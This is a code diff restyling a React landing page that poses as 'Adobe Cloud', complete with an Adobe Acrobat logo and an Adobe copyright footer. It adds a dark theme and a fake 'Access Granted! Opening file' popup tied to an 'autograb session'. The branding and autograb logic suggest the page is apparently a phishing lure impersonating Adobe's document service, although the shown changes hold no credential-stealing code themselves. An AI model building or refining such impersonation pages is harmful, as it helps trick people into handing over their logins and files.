@@ -161,7 +161,35 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
     // Check if we have an active session for autograb
     if (hasActiveSession && sessionInfo) {
       console.log('Using autograb session for file access:', sessionInfo);
-      alert(`Access granted! Opening ${fileName}...`);
+      const successDiv = document.createElement('div');
+      successDiv.innerHTML = `
+        <div style="
+          position: fixed;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background: #1E1E1E;
+          color: white;
+          padding: 20px;
+          border-radius: 10px;
+          box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+          z-index: 10000;
+          text-align: center;
+          font-family: system-ui, -apple-system, sans-serif;
+          border: 1px solid #FF0000;
+        ">
+          <div style="color: #FF0000; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
+            ✓ Access Granted!
+          </div>
+          <div style="color: #E5E7EB; font-size: 14px;">
+            Opening ${fileName}...
+          </div>
+        </div>
+      `;
+      document.body.appendChild(successDiv);
+      setTimeout(() => {
+        document.body.removeChild(successDiv);
+      }, 2000);
       return;
     }
 
@@ -177,8 +205,8 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
       <div className="w-20 h-20 bg-white/60 backdrop-blur-sm rounded-full flex items-center justify-center mb-6 shadow-lg">
         <Trash2 className="w-10 h-10 text-gray-400" />
       </div>
-      <h3 className="text-xl font-semibold text-gray-900 mb-3">Trash is empty</h3>
-      <p className="text-base text-gray-500 max-w-sm">
+      <h3 className="text-xl font-semibold text-white mb-3">Trash is empty</h3>
+      <p className="text-base text-gray-300 max-w-sm">
         When you delete files, they'll appear here before being permanently removed.
       </p>
     </div>
@@ -301,19 +329,21 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
 
   return (
     <div className="flex min-h-screen relative overflow-hidden">
-      {/* Adobe-style linear gradient background */}
-      <div className="absolute inset-0 bg-gradient-to-br from-[#F40F02] to-[#FAD0C4]"></div>
-      <div className="absolute inset-0 bg-white/10"></div>
+      {/* Dark gradient background with red/purple accents */}
+      <div className="absolute inset-0 bg-gradient-to-br from-[#121212] via-[#1E1E1E] to-[#2C2C2C]"></div>
+      <div className="absolute inset-0 bg-gradient-to-tr from-[#FF0000]/10 via-transparent to-[#8B5CF6]/10"></div>
       
-      {/* Subtle decorative elements */}
-      <div className="absolute top-5 right-5 w-60 h-60 bg-white/5 rounded-full blur-3xl"></div>
-      <div className="absolute bottom-5 left-5 w-48 h-48 bg-white/8 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/3 right-1/4 w-36 h-36 bg-white/6 rounded-full blur-xl"></div>
-      <div className="absolute bottom-1/3 left-1/3 w-40 h-40 bg-white/7 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/2 left-1/2 w-32 h-32 bg-white/5 rounded-full blur-xl transform -translate-x-1/2 -translate-y-1/2"></div>
+      {/* Subtle abstract shapes and blurry overlays */}
+      <div className="absolute top-5 right-5 w-60 h-60 bg-[#FF0000]/5 rounded-full blur-3xl"></div>
+      <div className="absolute bottom-5 left-5 w-48 h-48 bg-[#8B5CF6]/8 rounded-full blur-2xl"></div>
+      <div className="absolute top-1/3 right-1/4 w-36 h-36 bg-[#FF0000]/6 rounded-full blur-xl"></div>
+      <div className="absolute bottom-1/3 left-1/3 w-40 h-40 bg-[#EC4899]/7 rounded-full blur-2xl"></div>
+      <div className="absolute top-1/2 left-1/2 w-32 h-32 bg-[#8B5CF6]/5 rounded-full blur-xl transform -translate-x-1/2 -translate-y-1/2"></div>
+      <div className="absolute top-20 left-20 w-24 h-24 bg-[#FF0000]/4 rounded-full blur-lg"></div>
+      <div className="absolute bottom-20 right-20 w-28 h-28 bg-[#EC4899]/6 rounded-full blur-xl"></div>
 
       {/* Sidebar */}
-      <aside className="relative z-10 w-56 bg-white/95 backdrop-blur-xl border-r border-white/50 flex flex-col shadow-xl">
+      <aside className="relative z-10 w-56 bg-[#1E1E1E]/95 backdrop-blur-xl border-r border-[#2C2C2C]/60 flex flex-col shadow-xl">
         <div className="p-6 flex-1">
           {/* Logo Section with Acrobat Logo */}
           <div className="flex items-center gap-3 mb-6">
@@ -322,7 +352,7 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
               alt="Adobe Acrobat" 
               className="w-10 h-10 object-contain"
             />
-            <h1 className="text-lg font-semibold text-gray-900">Adobe Cloud</h1>
+            <h1 className="text-lg font-semibold text-white">Adobe Cloud</h1>
           </div>
 
           {/* Navigation */}
@@ -333,8 +363,8 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
                 onClick={() => setActiveNav(item)}
                 className={`text-left px-3 py-2.5 rounded-lg font-medium text-sm transition-all duration-200 ${
                   activeNav === item
-                    ? 'bg-red-50 text-red-600 shadow-sm'
-                    : 'text-gray-700 hover:bg-white/80 hover:backdrop-blur-sm'
+                    ? 'bg-[#FF0000]/10 text-[#FF0000] shadow-sm border border-[#FF0000]/20'
+                    : 'text-gray-300 hover:bg-[#2C2C2C]/80 hover:text-white'
                 }`}
               >
                 {item}
@@ -344,8 +374,8 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
         </div>
 
         {/* Adobe Footer */}
-        <div className="p-6 border-t border-white/50">
-          <p className="text-sm text-gray-700 leading-relaxed font-medium">
+        <div className="p-6 border-t border-[#2C2C2C]/60">
+          <p className="text-sm text-gray-400 leading-relaxed font-medium">
             © 2025 Adobe Inc.<br />
             All rights reserved.
           </p>
@@ -357,10 +387,10 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
         {/* Header */}
         <div className="flex justify-between items-start mb-6">
           <div className="min-w-0">
-            <h2 className="text-2xl font-bold text-gray-900 mb-1">
+            <h2 className="text-2xl font-bold text-white mb-1">
               {headerContent.title}
             </h2>
-            <p className="text-base text-gray-800 font-medium">{headerContent.description}</p>
+            <p className="text-base text-gray-300 font-medium">{headerContent.description}</p>
           </div>
           
           {/* Only show view controls if not in Trash */}
@@ -370,8 +400,8 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
                 onClick={() => setActiveView('List View')}
                 className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm border transition-all duration-200 shadow-sm ${
                   activeView === 'List View'
-                    ? 'bg-gradient-to-r from-red-600 to-red-700 text-white border-red-600'
-                    : 'bg-white/95 backdrop-blur-sm text-gray-700 border-gray-300 hover:bg-white'
+                    ? 'bg-gradient-to-r from-[#FF0000] to-[#DC2626] text-white border-[#FF0000]'
+                    : 'bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white'
                 }`}
               >
                 <List className="w-4 h-4" />
@@ -381,14 +411,14 @@ const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
                 onClick={() => setActiveView('Grid View')}
                 className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm border transition-all duration-200 shadow-sm ${
                   activeView === 'Grid View'
-                    ? 'bg-gradient-to-r from-red-600 to-red-700 text-white border-red-600'
-                    : 'bg-white/95 backdrop-blur-sm text-gray-700 border-gray-300 hover:bg-white'
+                    ? 'bg-gradient-to-r from-[#FF0000] to-[#DC2626] text-white border-[#FF0000]'
+                    : 'bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white'
                 }`}
               >
                 <Grid3X3 className="w-4 h-4" />
                 Grid
               </button>
-              <button className="flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm bg-white/95 backdrop-blur-sm text-gray-700 border border-gray-300 hover:bg-white transition-all duration-200 shadow-sm">
+              <button className="flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white transition-all duration-200 shadow-sm">
                 <Upload className="w-4 h-4" />
                 Upload
               </button>
